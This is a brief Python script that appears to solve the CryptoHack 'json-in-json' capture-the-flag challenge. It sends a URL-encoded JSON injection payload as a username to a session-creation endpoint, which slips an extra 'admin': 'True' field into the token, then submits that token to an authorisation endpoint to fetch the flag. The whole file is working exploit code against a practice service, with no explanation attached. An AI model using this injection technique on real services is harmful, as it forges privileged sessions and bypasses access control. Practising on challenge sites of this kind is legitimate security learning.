import urllib.parse
import urllib.request
import json 

injection_payload='admin%22%2C%20%22admin%22%3A%20%22True'

def generate_token(injection_payload):
    username_url="https://web.cryptohack.org/json-in-json/create_session/"+injection_payload+"/"    
    with urllib.request.urlopen(username_url) as f:
        data=json.loads(f.read(300).decode('utf-8'))
        print("Generated Token ::: -> "+str(data['session'])+"\n")
        return str(data['session'])

        

def get_flag(data):
    authurl = "https://web.cryptohack.org/json-in-json/authorise/"+data+"/"
    print(authurl)
    with urllib.request.urlopen(authurl) as f:
        data=f.read(300).decode('utf-8')
        return data
    
def trigger():
    token=generate_token(injection_payload)
    print(get_flag(token))
    

trigger()
